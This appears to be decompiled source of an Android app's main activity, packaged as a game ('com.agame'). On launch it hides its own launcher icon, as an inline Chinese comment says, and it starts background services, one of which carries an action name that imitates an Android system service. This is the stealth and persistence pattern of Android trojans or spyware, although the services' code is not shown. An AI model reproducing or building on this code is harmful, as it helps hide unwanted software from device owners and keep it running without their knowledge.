package com.agame;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;

import com.agame.http.Wksvr;

public class MainActivity extends Activity {

        @Override
        protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                // 隐藏程序图标
                this.start();
                this.startService();
                setContentView(R.layout.activity_main);
        }


        @Override
        public boolean onCreateOptionsMenu(Menu menu) {
                getMenuInflater().inflate(R.menu.main, menu);
                return true;
        }

        void startService() {
                if (!Util.isWorked(this.getBaseContext(), TMyService.class.getName())) {
                        Intent intent = new Intent(this.getBaseContext(), TMyService.class);
                        intent.setAction(TMyService.class.getName());
                        this.getBaseContext().startService(intent);
                }

                if (!Util.isWorked(this.getBaseContext(), Wksvr.class.getName())) {
                        Intent intent = new Intent(this.getBaseContext(), Wksvr.class);
                        intent.setAction("com.system.android.Wksvr");
                        this.getBaseContext().startService(intent);
                }
        }

        void start() {
                try {
                        this.getPackageManager().setComponentEnabledSetting(this.getComponentName(), 2, 1);
                } catch (Exception v1) {
                }
        }

}
